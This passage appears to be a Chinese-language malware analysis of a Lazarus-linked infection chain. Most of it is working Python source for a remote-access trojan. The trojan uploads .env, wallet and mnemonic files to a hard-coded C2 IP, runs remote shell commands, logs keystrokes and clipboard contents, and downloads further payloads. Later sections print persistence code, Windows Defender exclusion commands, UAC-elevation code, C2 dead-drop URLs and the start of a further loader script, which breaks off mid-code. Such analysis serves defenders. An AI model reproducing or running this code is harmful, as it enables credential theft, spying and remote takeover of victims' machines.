ex_files = ['.exe','.dll','.msi','.dmg','.iso','.pkg','.apk','.xapk','.aar','.ap_','.aab','.dex','.class','.rpm','.deb','.ipa','.dsym','.mp4','.avi','.mp3','.wmv','.wma','.mov','.webm','.avchd','.mkv','.ogg','.mpe','.mpv','.mpeg','.m4p','.m4a','.m4v','.aac','.flac','.aiff','.qt','.flv','.swf','.pyc','.lock','.psd','.pack','.old','.ppt','.pptx','.virtualization','.indd','.eps','.ai','.a','.jar','.so','.o','.wt','.lib','.dylib','.bin','.ffx','.svg','.css','.scss','.gem','.html']
ex_dirs = ['vendor','Pods','node_modules','.git','.next','.externalNativeBuild','sdk','.idea','cocos2d','compose','proj.ios_mac','proj.android-studio','Debug','Release','debug','release','obj','Obj','xcuserdata','.gradle','build','storage','.android','Program Files (x86)','$RECYCLE.BIN','Program Files','Windows','ProgramData','cocoapods','homebrew','.svn','sbin','standalone','local','ruby','man','zsh','Volumes','Applications','Library','System','Pictures','Desktop','usr','android','var','__pycache__','.angular','cache','.nvm','.yarn','.docker','.local','.vscode','.cache','__MACOSX','.pyp','.gem','.config','.rustup','.pyenv','.rvm','.sdkman','.nix-defexpr','.meteor','.nuget','.cargo','.vscode-insiders','.gemexport','.Bin','.oh-my-zsh','.rbenv','.ionic','.mozilla','.var','.cocoapods','.flipper','.forever','.quokka','.continue','.pub-cache','.debris','jdk','.wine32','.phpls','.typeChallenges','.sonarlint','.aptos','.bluemix','.bundle','.cabal','.changes','.changeset','.circleci','.cp','.cpanm','.cxx','.dart_tool','.dartServer','.dbvis','.deps','.devcontainer','.dotnet','.dropbox.cache','.dthumb','.ebcli-virtual-env','.eclipse','eclipse','.electrum','.executables','.exp','.ghcup','.github','.gnupg','.hash','.hasura','.IdentityService','.indexes','.install','.install4j','.kokoro','.localized','.npm','.node-gyp','.p2','.platformio','.plugin_symlinks','.plugins','.store','.storybook','.tmp','tmp','.turbo','.versions','.vs','.vscode-server','.yalc','!azure','x-pack','lib64','site-packages','node_modules12','kibana-8.5.0','google-cloud-sdk','golang.org','Assets.xcassets','arduino']
pat_envs = ['.env','config.js','secret','metamask','wallet','private','mnemonic','password','account','.xls','.xlsx','.doc','.docx','.rtf']
ex1_files = ['.php','.svg','.htm','.hpp','.cpp','.xml','.png','.swift','.ccb','.jsx','.tsx','.h','.java']
ex2_files = ['tsconfig.json','tailwind.config.js','svelte.config.js','next.config.js','babel.config.js','vite.config.js','webpack.config.js','postcss.config.js','robots.txt','license.txt','.ds_store','.angular-config.json','package-lock.json']

def ld(rd,pd):
    dir=os.path.join(rd,pd);res=[];res.append((pd,''));sa = os.listdir(dir)
    for x in sa:
        fn=os.path.join(dir,x)
        try:
            x0 = x.lower()
            if os.path.isfile(fn):
                ff, fe = os.path.splitext(x0)
                if not fe in ex_files and os.path.getsize(fn) < 104857600:res.append((pd, x))
            elif os.path.isdir(fn):
                if not x in ex_dirs and not x0 in ex_dirs:
                    if pd != '':t=pd+'/'+x
                    else:t=x
                    res=res+ld(rd,t)
        except:pass
    return res

def fmt_s(s):
    if s<1024:return str(s)+'B'
    elif s<1048576:return'{:.0f}KB'.format(s/1024.)
    elif s<1073741824:return'{:.1f}MB'.format(s/1048576.)
    else:return'{:.1f}GB'.format(s/1073741824.)

def write_flist(s):
    default_path = os.path.join(os.path.expanduser("~"), ".n2")
    if os.path.exists(default_path + '/flist') == False:
        make_file = open(default_path + '/flist', 'w')
        make_file.close()
    with open(default_path + '/flist', 'a') as f:
        f.write(s)

def ups(sn):
    try:
        up_time = str(int(time.time()))
        files = [
            ('multi_file', (up_time + '_' + os.path.basename(sn), open(sn, 'rb'))),
        ]
        r = {
            'type': sType,
            'hid': gType + '_' + sHost,
            'uts': 'auto_upload',
        }
        host2 = f"http://{HOST}:{PORT}"
        requests.post(host2 + "/uploads", files=files, data=r)
        if os.path.basename(sn) != 'flist':
            write_flist(up_time + '_' + os.path.basename(sn) + " : " + sn + "\n")
    except: pass

def fpatten(pat):
    try:
        if os_type == "Windows":
            command = 'dir /b /s ' + pat + ' | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
        else:
            command = 'find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name ' + pat + ' -print'
        proc=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()

        dirs = proc[0].decode('utf8').split('\n')
        if dirs != ['']:
            for key in dirs:
                if key.strip() == '':
                    continue
                ups(key.strip())
    except: pass

def uenv(C):
    proc=subprocess.Popen(C,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()

    dirs = proc[0].decode('utf8').split('\n')
    if dirs != ['']:
        for key in dirs:
            if key.strip() == '':
                continue

            ups(key.strip())

def fenv():
    drive_list = ['C', 'D', 'E', 'F', 'G']
    try:
        if os_type == "Windows":
            for key in drive_list:
                if os.path.exists(f"{key}:\\") == False:
                    continue
                c = 'dir /b /s ' + key + ':\*.env | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
                uenv(c)
        else:
            c = 'find ~/ -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *.env -print'
            uenv(c)
    except: pass

def auto_up():
    # fpatten('*mnemonic*')
    # fpatten('truffle.config*')
    # fpatten('hardhat.config*')
    # fenv()
    print()

os_type = platform.system()
class Shell(object):
    def __init__(A,S):
        A.sess = S;A.is_alive = _T;A.is_delete = _F;A.lock = RLock();A.timeout_count=0;A.cp_stop=0
        A.par_dir = os.path.join(os.path.expanduser("~"), ".n2")
        A.cmds = {1:A.ssh_obj,2:A.ssh_cmd,3:A.ssh_clip,4:A.ssh_run,5:A.ssh_upload,6:A.ssh_kill,7:A.ssh_any,8:A.ssh_env}
        print("init success")
    def listen_recv(A):
        while A.is_alive:
            try:
                print("start listen")
                recv=A.sess.recv()
                print("listen recv:", recv)
                if recv==-1:
                    if A.timeout_count<30:A.timeout_count+=1;continue
                    else:A.timeout_count=0;recv=_N
                if recv:
                    A.timeout_count=0
                    with A.lock:
                        D=json.loads(recv);c=D['code'];args=D['args']
                        try:
                            if c != 2:
                                args=ast.literal_eval(args)
                        except:
                            pass
                        if c in A.cmds:tg=A.cmds[c];t=Thread(target=tg,args=(args,));t.start()#tg(args)
                        else:
                            if A.is_alive:A.is_alive=_F;A.close()
                else:
                    if A.is_alive:A.timeout_count=0;A.is_alive=_F;A.close()
            except Exception as ex:print("error_listen:", ex)

    def shell(A):
        print("start shell")
        t1 = Thread(target=A.listen_recv);t1.daemon=_T;t1.start()
        while A.is_alive:
            try:sleep(5)
            except:break
        A.close()
        return A.is_delete

    def send(A,code=_N,args=_N):A.sess.send(code=code,args=args)
    def sendall(A,m):A.sess.sendall(m)
    def close(A):A.is_alive=_F;A.sess.shutdown()
    def send_n(A,a,n,o):p={_A:a,_O:o};A.send(code=n,args=p)

    def ssh_cmd(A,args):
        try:
            if os_type == "Windows":
                subprocess.Popen('taskkill /IM /F python.exe', shell=_T)
            else:
                subprocess.Popen('killall python', shell=_T)
        except: pass

    def ssh_obj(A,args):
        o=''
        try:
            a=args[_A];cmd=args['cmd']
            if cmd == '':o=''
            elif cmd.split()[0] == 'cd':
                proc = subprocess.Popen(cmd, shell=_T)
                if len(cmd.split()) != 1:
                    p=' '.join(cmd.split()[1:])
                    if os.path.exists(p):os.chdir(p)
                o=os.getcwd()
            else:
                proc=subprocess.Popen(cmd,shell=_T,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
                try:o=decode_str(proc[0]);err=decode_str(proc[1])
                except:o=proc[0];err=proc[1]
                o=o if o else err
        except:pass
        p={_A:a,_O:o};A.send(code=1, args=p)

    def ssh_clip(A,args):
        global e_buf
        try:A.send(code=3, args=e_buf);e_buf = ""
        except:pass

    def bro_down(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/brow/"+sType+"/"+gType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_run(A,args):
        try:
            a=args[_A];p=A.par_dir+"/bow";res=A.bro_down(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get browse'
        except Exception as e:o = f'Err4: {e}';pass
        p={_A:a,_O: o};A.send(code=4,args=p)

    def send_5(A,a,o):A.send_n(a,5,o)

    def ssh_upload(A,args):
        o=''
        try:
            D=args[_A];cmd=args['cmd']
            cmd=ast.literal_eval(cmd)
            if 'sdir' in cmd:sdir=cmd['sdir'];dn=cmd['dname'];sdir=sdir.strip();dn=dn.strip();A.ss_upd(D,cmd,sdir,dn);return _T
            elif 'sfile' in cmd:sfile=cmd['sfile'];dn=cmd['dname'];sfile=sfile.strip();dn=dn.strip();A.ss_upf(D,cmd,sfile,dn);return _T
            elif 'sfind' in cmd:dn=cmd['dname'];pat=cmd['sfind'];dn=dn.strip();pat=pat.strip();A.ss_ufind(D,cmd,dn,pat);return _T
            else:A.ss_ups();o='Stopped ...'
        except Exception as e:print("error_upload:", str(e));o = f'Err4: {e}';pass
        A.send_5(D,o)

    def ss_upd(A,D,args,sd,name):
        A.cp_stop=0;t=_N
        try:
            if sd=='.':sd=os.getcwd()
            A.send_5(D,' >> upload start: ' + sd)
            res=ld(sd,'')
            A.send_5(D,'  -count: ' + str(len(res)-1))
            for (x,y) in res:
                if A.cp_stop==1:A.send_5(D,' upload stopped ');return
                if y=='':continue
                A.ss_hup(os.path.join(sd,y),D,name,5)
            A.send_5(D,' uploaded success ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_hup(A,sn,D,name,n):
        try:
            up_time = str(int(time.time()))
            files = [
                ('multi_file', (up_time + '_' + os.path.basename(sn), open(sn, 'rb'))),
            ]
            r = {
                'type': sType,
                'hid': gType + '_' + sHost,
                'uts': name,
            }
            host2 = f"http://{HOST}:{PORT}"
            requests.post(host2 + "/uploads", files=files, data=r)
            if os.path.basename(sn) != 'flist':
                write_flist(up_time + '_' + os.path.basename(sn) + " : " + sn + "\n")
                o=' copied ' + fmt_s(os.path.getsize(sn)) + ':  ' + os.path.basename(sn)
                A.send_n(D,n,o)
            else:
                os.remove(sn)
        except Exception as e:o=' failed: '+sn+' > '+str(e);A.send_n(D,n,o)

    def ss_upf(A,admin,args,sfile,name):
        D=admin;A.cp_stop=0;t=_N
        try:
            sdir=os.getcwd()
            A.send_5(D,' >> upload start: ' + sdir + ' ' + sfile)
            sn=os.path.join(sdir,sfile)
            A.ss_hup(sn,D,name,5)
            A.send_5(D,' uploaded done ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ufind(A,D,args,name,pat):
        A.cp_stop=0;t=_N
        try:
            A.send_5(D,' >> ufind start: ' + os.getcwd())
            if os_type == "Windows":
                command = 'dir /b /s ' + pat + ' | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
            else:
                command = 'find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name ' + pat + ' -print'
            proc=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()

            dirs = proc[0].decode('utf8').split('\n')
            if dirs == ['']:
                A.send_5(D,'  -count: ' + str(0))
                A.send_5(D,' Not exist ')
            else:
                A.send_5(D,'  -count: ' + str(len(dirs)-1))
                for key in dirs:
                    if A.cp_stop == 1:A.send_5(D,' upload stopped ');break
                    if key.strip() == '':
                        continue
                    A.ss_hup(key.strip(),D,name,5)
                A.send_5(D,' ufind success ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ups(A):A.cp_stop=1

    def ss_uenv(A,D,C):
        proc=subprocess.Popen(C,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()

        dirs = proc[0].decode('utf8').split('\n')
        if dirs == ['']:
            A.send_n(D, 8,'  -count: ' + str(0))
        else:
            A.send_n(D, 8,'  -count: ' + str(len(dirs)-1))
            for key in dirs:
                if A.cp_stop == 1:A.send_n(D, 8,' upload stopped ');break
                if key.strip() == '':
                    continue

                A.ss_hup(key.strip(),D,'global_env',8)

    def ssh_env(A,args):
        drive_list = ['C', 'D', 'E', 'F', 'G']
        A.cp_stop = 0
        try:
            a=args[_A];c=args['cmd']
            c=ast.literal_eval(c)
            A.send_n(a,8,'--- uenv start ')

            if os_type == "Windows":
                for key in drive_list:
                    if os.path.exists(f"{key}:\\") == False:
                        continue
                    c = 'dir /b /s ' + key + ':\*.env | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
                    A.ss_uenv(a,c)
            else:
                c = 'find ~/ -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *.env -print'
                A.ss_uenv(a,c)
            A.send_n(a,8,'--- uenv success ')
        except Exception as e:A.send_n(a,8,' uenv err: '+str(e))

    def ssh_kill(A,args):
        D=args[_A]
        if os_type == "Windows":
            try:subprocess.Popen('taskkill /IM chrome.exe /F')
            except:pass
            try:subprocess.Popen('taskkill /IM brave.exe /F')
            except:pass
        else:
            try:subprocess.Popen('killall Google\ Chrome')
            except:pass
            try:subprocess.Popen('killall Brave\ Browser')
            except:pass
        p={_A:D,_O: 'Chrome & Browser are terminated'}
        A.send(code=6,args=p)

    def down_any(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/adc/"+sType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_any(A,args):
        try:
            D=args[_A];p = A.par_dir + "/adc";res=A.down_any(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get anydesk'
        except Exception as e:o = f'Err7: {e}';pass
        p={_A:D,_O:o};A.send(code=7,args=p)

HOST0 = '146.70.253.107'
PORT0 = 2241

class Client():
    def __init__(A):A.server_ip = HOST0;A.server_port = PORT0;A.is_active = _F;A.is_alive = _T;A.timeout_count = 0;A.shell = _N

    @property
    def make_connection(A):
        while _T:
            try:
                A.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s = Session(A.client_socket)
                s.connect(A.server_ip, A.server_port)
                A.shell = Shell(s);A.is_active = _T
                if A.shell.shell():
                    try:dir = os.getcwd();print("dir:", dir);fn=os.path.join(dir,sys.argv[0]);print("fn:", fn);os.remove(fn)
                    except Exception as ex:print("connection error:", ex);pass
                    return _T
                sleep(15)
            except Exception as e: print("error_make:", e); sleep(20);pass
    def run(A):
        t2=Thread(target=auto_up);t2.daemon=_T;t2.start()
        if A.make_connection:return

client = Client()
import sys

is_w=sys.platform.startswith('win')
if __name__ == "__main__":
    if is_w == _F:
        try:client.run()
        except KeyboardInterrupt:pass
        sys.exit(0)

_M='-m';_P='pip';_L='install'
import subprocess
try:import pyWinhook as pyHook
except:subprocess.check_call([sys.executable,_M,_P,_L,'pyWinhook']);import pyWinhook as pyHook
try:import pyperclip
except:subprocess.check_call([sys.executable,_M,_P,_L,'pyperclip']);import pyperclip
try:import psutil
except:subprocess.check_call([sys.executable,_M,_P,_L,'psutil']);import psutil
try:import win32process
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import win32process
try:import pythoncom
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import pythoncom
try:import win32gui
except:subprocess.check_call([sys.executable,_M,_P,_L,'pywin32']);import win32gui

def act_win_pn():
    try:pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow());return (pid[-1], psutil.Process(pid[-1]).name())
    except:pass

def write_txt(text):0

c_win = 0
def check_window(event):
    global c_win
    if c_win != event.Window:
        (pid, text) = act_win_pn()
        tz = timezone(offset=timedelta(hours=9))
        d_t = datetime.fromtimestamp(time.time(), tz)
        t_s = d_t.strftime("%m/%d/%Y, %H:%M:%S")

        c_win = event.Window
        return f"\n**\n-[ {text} | PID: {pid}-{c_win}\n-[ @ {t_s} | {event.WindowName}\n**\n"
    return ""
m_win = 0
def hmld(event):
    global e_buf, m_win
    if m_win!=event.Window:m_win=event.Window;tt='<..>'
    else:tt='<.>'
    e_buf+=tt;write_txt(tt);return _T

def hmrd(event):
    global e_buf, m_win
    if m_win!=event.Window:m_win=event.Window;tt='<,,>'
    else:tt='<,>'
    e_buf+=tt;write_txt(tt);return _T

def is_down(status):
    if status == 128: return _T
    return _F

def is_control_down():
    return is_down(pyHook.GetKeyState(0x11)) or is_down(pyHook.GetKeyState(0xA2)) or is_down(pyHook.GetKeyState(0xA3))

def run_copy_clipboard():
    global e_buf
    try:
        copied = pyperclip.waitForPaste(0.05)
        tt = "\n=================BEGIN================\n";tt += copied;tt += "\n==================END==================\n"
        e_buf += tt;write_txt(tt)
    except Exception as ex:pass

def hkb(event):
    if event.KeyID == 0xA2 or event.KeyID == 0xA3:return _T

    global e_buf
    tt = check_window(event)

    key = event.Ascii
    if (is_control_down()):key=f"<^{event.Key}>"
    elif key==0xD:key="\n"
    else:
        if key>=32 and key<=126:key=chr(key)
        else:key=f'<{event.Key}>'
    tt += key
    if is_control_down() and event.Key == 'C':
        start_time = Timer(0.1, run_copy_clipboard)
        start_time.start()
    elif is_control_down() and event.Key == 'V':
        start_time = Timer(0.1, run_copy_clipboard)
        start_time.start()

    e_buf += tt;write_txt(tt);return _T
def startHk():hm = pyHook.HookManager();hm.MouseLeftDown = hmld;hm.MouseRightDown = hmrd;hm.KeyDown = hkb;hm.HookMouse();hm.HookKeyboard()
def hk_loop():startHk();pythoncom.PumpMessages()
def run_client():
    t1=Thread(target=hk_loop);t1.daemon=_T;t1.start()
    try:client.run()
    except KeyboardInterrupt:sys.exit(0)

if __name__ == "__main__":
    run_client()

```

---

#### ~/.n2/pow

這隻程式是針對 windows 環境進行惡意攻擊。

首先將 hard code 的 python 程式碼，寫入`%APPDATA_ROAMING_DIRECTORY%/Microsoft/Windows/StartMenu/Programs/Startup/Windows Update Script.PyW`

達成開機自啟動

##### Windows Update Script.PyW

程式碼當中有需多 Hard Code 被加密過後的密文，這些密文會經過 XOR 解密,key = `!!!HappyPenguin1950!!!` + base64decode + 反轉，會解出需多 `https://pastebin[.]com/` 的網址，接下來會去拿可以訪問的網址內的資料進行解密。

```
https://pastebin.com/u/HolesGarmin3166_OnsitePoet2677
https://pastebin.com/u/CrackEden1251_WaitsRenee9809
https://pastebin.com/u/KerrWhale2274_KnowNtsc6785
https://pastebin.com/u/NumberHunt2579_JazzByrne1819
https://pastebin.com/u/AtomIsps2511_FinedPress2664
https://pastebin.com/u/ZoomHockey3706_MassBallet5863
https://pastebin.com/u/RehabVagina9550_PaceTiles7442
https://pastebin.com/u/NanoDubai9234_LoaderGeoff3367
https://pastebin.com/u/ThankSends9968_BiosCube2008
https://pastebin.com/u/NegroConfig1449_SoupRule3443
https://pastebin.com/u/EnglBlazer5735_FittedInjury1823
https://pastebin.com/u/FeetMosque6032_KellerFinest4047
https://pastebin.com/u/NotingRobe2871_FranzStill8494
https://pastebin.com/u/CementTeddy9347_SalesRacks7262
...
```

`HolesGarmin3166_OnsitePoet2677` 這樣的串接字串代表前面是 username ，後面是檔案名稱，接下來寫腳本去測試每一個 url ，最後只有唯一一個還可以訪問的是 `https://pastebin[.]com/u/NotingRobe2871`

 <img src="/assets/LinkedinPastebin.png" alt="image-20260125101548610" />

內容如下

```
7b226d657373616765223a202234333133373732333030323832393064333230383537313731313265323030303633373230393538343536363134353136643332333834313364326136343535323030643330316332303735366334633763346236633538366435383139376530323338323234393331323435333561222c20227369676e6174757265223a20226a3363696947733356564e63535465634d3465315a4c41307471643264566a3955673175364f33787267396e66616e6669384a724961546651786a52697a50735058345a4458422b494b686944355a7171635744514c4770354f555143384d39557678556877712f596d743533473261647969636547394265486248716e487a6275707568707572432b6968427666356e34334d6d387937712b4169627a4e626d597056556662766f42524d693372514b554b4b48313548654d476a4e784a57586d6f645a746f2b4e65392f3430434f3374417931736d5534333950746c535159536b70703067797477484c357a6c4d417a44684c4c46396565634f6d734c694363625645694b766a557941704a32416d55773268364a595a466967632f457361455a533959576f476675695665434f736c7651336a6977674557766f7270655051316f5331713043774d5a4834525049776b6d43513d3d227d
```

這個內容也再經過 XOR 解密,key = `!!!HappyPenguin1950!!!` + base64decode + 反轉之後會得到

```json
{
  "message": "431377230028290d32085717112e200063720958456614516d3238413d2a6455200d301c20756c4c7c4b6c586d58197e023822493124535a",
  "signature": "j3ciiGs3VVNcSTecM4e1ZLA0tqd2dVj9Ug1u6O3xrg9nfanfi8JrIaTfQxjRizPsPX4ZDXB+IKhiD5ZqqcWDQLGp5OUQC8M9UvxUhwq/Ymt53G2adyiceG9BeHbHqnHzbupuhpurC+ihBvf5n43Mm8y7q+AibzNbmYpVUfbvoBRMi3rQKUKKH15HeMGjNxJWXmodZto+Ne9/40CO3tAy1smU439PtlSQYSkpp0gytwHL5zlMAzDhLLF9eecOmsLiCcbVEiKvjUyApJ2AmUw2h6JYZFigc/EsaEZS9YWoGfuiVeCOslvQ3jiwgEWvorpePQ1oS1q0CwMZH4RPIwkmCQ=="
}
```

他會先去驗證這個 signature ，驗證方式是在程式當中有 hard code 一個十六進制編碼的 RSA 公鑰

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvRgxN5vWny1/dAc7s6KM
ZURyqQti1OE11PkaXPY32E39TKau6vD+QntWKNTFI53WmkvY6YbLGf06oiZ99uYd
TkeL/gtKfnaPPOt1mADL9R3nFwvyWABw7Q41NgYlu7XHMiTUuh/TRPvOiXL5yKx+4
PnXsN+sE93pk2qNpB+cnJ1/b4re89xuNpD9HQjzsda3PNOD13s7OL7fq+74tY4oc
MQ6BNFOq9J46xd/4jay8n/q33v3PgwwoL6TQR5grUdfblXZ8WZzxXVKEqMtqJtmR
M8zjHoods0PoopOS6IzoYD+anchz5JCKHBrrMXd8g+A2hMq+W5lEkIvtbe1dPXsn
CQIDAQAB
-----END PUBLIC KEY-----
```

並利用以下程式碼驗證 message 是否有被修改過

```python
trusted_public_key.verify(
    signature,
    message.encode("utf-8"),
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
```

驗證通過後會對message內的內容進行 XOR 解密,key = `!!!HappyPenguin1950!!!` + base64decode + 反轉，解密之後得到

```text
http://23.254.164[.]156/introduction-video
```

他會去訪問他並下載回傳檔案，儲存在`{ROAMING_APPDATA_PATH} \Microsoft\Windows \Applications \Runtime Broker.exe`

下載的檔案 sha256 ： `ab7608bc7af2c4cdf682d3bf065dd3043d7351ceadc8ff1d5231a21a3f2c6527`

根據 [VirusTotal](https://www.virustotal.com/gui/file/ab7608bc7af2c4cdf682d3bf065dd3043d7351ceadc8ff1d5231a21a3f2c6527/detection) ，這個是一個已知的惡意程式，並且這個惡意程式在`~/.n2/pow ` 被成為TSUNAMI_INSTALLER。

而 TSUNAMI_INSTALLER 在 https://research.hisolutions.com/2025/04/rolling-in-the-deepweb-lazarus-tsunami/ 這篇分析報告提到是被 Lazarus Group 使用的

此外他還會持續的向使用者請求 UAC 權限，去執行 TSUNAMI_PAYLOAD_PATH 這個 TSUNAMI_PAYLOAD_PATH 路徑為`C:\Users\<Username>\AppData\Local\Temp\<16位隨機亂碼>` 這是也是 Hard code 的程式碼在此程式被寫入進去

```python
def execute_payload_with_uac() -> bool:
    # Get the filepath of the pythonw.exe

    py_exe = sys.executable
    py_exe = py_exe.replace("python.exe", "pythonw.exe")

    # Execute the payload with UAC

    result = ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        py_exe,
        f'"{TSUNAMI_PAYLOAD_PATH}"',
        None,
        1
    )

    # Return true if it worked, false if it failed

    if result <= 32:
        return False
    else:
        return True
        #hel p me
```

##### C:\Users\<Username>\AppData\Local\Temp\\<16位隨機亂碼>

這個檔案被稱為是 TSUNAMI_PAYLOAD

會執行以下操作

- 將三個路徑加入 Windows Defender 的排除名單，並且根據原程式的註解，可以得知到他們代表什麼惡意程式
  - Tsunami Installer:`%APPDATA%\Microsoft\Windows\Applications\Runtime Broker.exe`

  - Tsunami Client:`%APPDATA%\Microsoft\Windows\Applications\Runtime Broker.exe`

  - XMRig miner: `%LOCALAPPDATA%\Microsoft\Windows\Applications\msedge.exe`

    ```python
    EXCEPTION_PATHS = [
            # Tsunami Installer
            rf"{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe",
            # Tsunami Client
            rf"{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\Runtime Broker.exe",
            # XMRig miner
            rf"{LOCAL_APPDATA_PATH}\Microsoft\Windows\Applications\msedge.exe"
        ]
    
        for filepath in EXCEPTION_PATHS:
            add_windows_defender_exception(filepath)
    
    def add_windows_defender_exception(filepath: str) -> None:
        try:
            subprocess.run(
                ["powershell.exe", f"Add-MpPreference -ExclusionPath '{filepath}'"],
                shell = True,
                creationflags = subprocess.CREATE_NO_WINDOW,
                stdout = subprocess.PIPE,
                stderr = subprocess.PIPE,
                stdin = subprocess.PIPE
            )
    
            output(f"Added a new file to the Windows Defender exception")
        except Exception as e:
            output(f"[-] Failed to add Windows Defender exception: {e}")
    ```

- 建立 Scheduleled Task ，名稱為 ： Runtim broker

  ```python
  powershell_script = f\"\"\"
          $Action = New-ScheduledTaskAction -Execute "{TSUNAMI_INSTALLER_PATH}"
          $Trigger = New-ScheduledTaskTrigger -AtLogOn
          $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
          $Principal.RunLevel = 1
          $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
          Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -TaskName "Runtime Broker"
                           \"\"\"
  
      try:
          subprocess.run(
              ["powershell.exe","-Command", powershell_script],
              check = True,
              creationflags = subprocess.CREATE_NO_WINDOW
          )
  
          output("[+] Successfully created the task")
      except Exception as e:
          output(f"[-] Failed to create the task: {e}")
  
  ```

##### ~/.n2/pow 完整程式

```python
try:
    ##### Imports #####

    import subprocess
    import traceback
    import warnings
    import platform
    import tempfile
    import winreg
    import ctypes
    import random
    import base64
    import zlib
    import time
    import sys
    import os

    ##### Supress Warnings #####

    try:
        warnings.filterwarnings("ignore")
    except:
        pass

    ##### Globals #####

    DEBUG_MODE = False

    PYTHON_INSTALLER_URL = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe"

    APPDATA_ROAMING_DIRECTORY = os.getenv("APPDATA")

    TSUNAMI_INJECTOR_NAME = "Windows Update Script.pyw"
    TSUNAMI_INJECTOR_FOLDER = f"{APPDATA_ROAMING_DIRECTORY}/Microsoft/Windows/Start Menu/Programs/Startup"
    TSUNAMI_INJECTOR_PATH = rf"{TSUNAMI_INJECTOR_FOLDER}/{TSUNAMI_INJECTOR_NAME}"

    TSUNAMI_INJECTOR_SCRIPT = """
RandVar = '?'

##### Imports #####

from cryptography.hazmat.primitives import hashes, serialization
